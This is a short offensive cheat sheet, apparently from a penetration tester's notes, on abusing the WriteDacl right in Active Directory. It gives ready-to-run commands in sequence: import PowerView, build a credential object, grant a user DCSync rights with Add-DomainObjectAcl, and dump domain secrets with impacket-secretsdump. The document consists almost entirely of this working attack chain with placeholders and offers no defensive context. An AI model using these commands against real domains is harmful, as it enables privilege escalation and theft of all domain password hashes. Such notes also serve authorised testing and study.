---
title: "WriteDacl"
date: 2024-7-12
tags: ["WriteDacl", "active driectory", "ad", "Windows", "dcsync", "secretsdump"]
---

---
### Abuse #1: Add dcsync right to user

#### 1. Import PowerView.ps1 

```powershell
. .\PowerView.ps1
```

#### 2. Create cred object (runas) \[optional\]

```powershell
$username = "<DOMAIN>\<USER>"
```

```powershell
$password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force
```

```powershell
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
```

#### 3. Add dcsync right

```powershell
Add-DomainObjectAcl -PrincipalIdentity <USER> -TargetIdentity '<DOMAIN>\<TARGET_GROUP>' -Rights DCSync -Credential $cred
```

### 4. Secrets dump

```bash
impacket-secretsdump <USER>:<PASSWORD>@<TARGET>
```

<br>